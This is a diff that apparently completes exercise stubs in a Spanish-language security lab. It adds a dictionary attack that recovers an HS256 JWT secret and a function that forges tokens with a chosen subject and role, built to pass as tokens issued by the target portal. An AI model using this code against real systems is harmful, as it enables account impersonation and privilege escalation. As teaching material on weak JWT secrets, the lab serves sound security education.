@@ -71,16 +71,29 @@ def crackear_secreto(token: str, diccionario: str) -> str:
     """Probá cada palabra del diccionario como secreto hasta que
     firma_es_valida() dé True. Devolvé el secreto encontrado.
     (Si querés, aplicá reglas como en el Lab Extra 4: año, 123, mayúscula.)"""
-    # TODO
-    raise NotImplementedError("Completá crackear_secreto()")
+    with open(diccionario, encoding="utf-8") as f:
+        for linea in f:
+            candidato = linea.rstrip("\n")
+            if not candidato:
+                continue
+            if firma_es_valida(token, candidato.encode()):
+                return candidato
+    return None
 
 
 def forjar(secreto: bytes, sub: str, role: str) -> str:
     """Firmá un token propio: header {"alg":"HS256","typ":"JWT"}, payload con
     sub/role/iat/exp (exp = ahora + 1 hora). Devolvé "cab.pay.firma".
     Cuando esto funciona, el servidor ya no distingue tu token de uno real."""
-    # TODO
-    raise NotImplementedError("Completá forjar()")
+    ahora = int(time.time())
+    header = {"alg": "HS256", "typ": "JWT"}
+    payload = {"sub": sub, "role": role, "iat": ahora, "exp": ahora + 3600}
+    # JSON compacto y mismas claves que usa el portal, para que el token
+    # forjado sea indistinguible de uno emitido por /login.
+    partes = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." \
+        + b64url(json.dumps(payload, separators=(",", ":")).encode())
+    firma = hmac.new(secreto, partes.encode(), hashlib.sha256).digest()
+    return partes + "." + b64url(firma)
 
 
 def main() -> int:
